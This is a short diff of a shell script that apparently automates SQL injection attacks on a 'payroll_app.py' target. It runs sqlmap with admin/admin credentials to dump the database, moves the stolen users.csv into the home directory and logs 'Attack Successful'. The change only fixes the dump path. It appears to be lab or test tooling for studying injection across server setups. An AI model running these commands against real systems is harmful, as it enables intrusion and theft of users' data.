@@ -18,7 +18,7 @@ elif [ $SERVER == "python" ]
 then
 	Y | sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump
 	FILE=~/users.csv
-	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/ 
+	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
 	if test -f "$FILE"
 	then
 		echo "$(date)   -->    $DATABASE, Python  -->   Attack Successful" >> ~/attack-log.txt
